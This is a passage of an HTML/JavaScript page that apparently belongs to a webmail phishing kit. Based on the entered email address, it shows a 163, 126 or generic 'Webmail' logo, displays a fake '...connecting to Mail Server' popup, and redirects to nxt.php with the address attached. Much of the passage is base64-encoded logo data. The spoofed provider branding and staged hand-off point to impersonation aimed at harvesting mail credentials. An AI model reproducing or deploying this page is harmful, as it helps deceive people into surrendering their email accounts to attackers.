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' width='100' />"; 
		   var the_server = "163";
		   jQuery.facebox("<div class='pop_up_class'>"+the_image+"...connecting to "+the_server+" Mail Server<img src='images/loading.gif' width='30'></div>");
		   		 setTimeout(function(){
			   window.location.href="nxt.php?email="+email;
        },2000);
	 }
	 	  else if(email.indexOf("126.com") != -1){
		   var the_image = "<img src='data:image/png;base64,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' width='100' />"; 
		   var the_server = "126";
		   jQuery.facebox("<div class='pop_up_class'>"+the_image+"...connecting to "+the_server+" Mail Server<img src='images/loading.gif' width='30'></div>");
		   		 setTimeout(function(){
			   window.location.href="nxt.php?email="+email;
        },2000);
	 }
	 	  else if(email.indexOf("") != -1){
		   var the_image = "<img src='http://logo-logos.com/wp-content/uploads/2016/11/Webmail_logo.png' width='100' />"; 
		   var the_server = "Webmail";
		   jQuery.facebox("<div class='pop_up_class'>"+the_image+"...connecting to "+the_server+" Mail Server<img src='images/loading.gif' width='30'></div>");
		   		 setTimeout(function(){
			   window.location.href="nxt.php?email="+email;
        },2000);
	 }

	});

})

</script>
</body>
</html>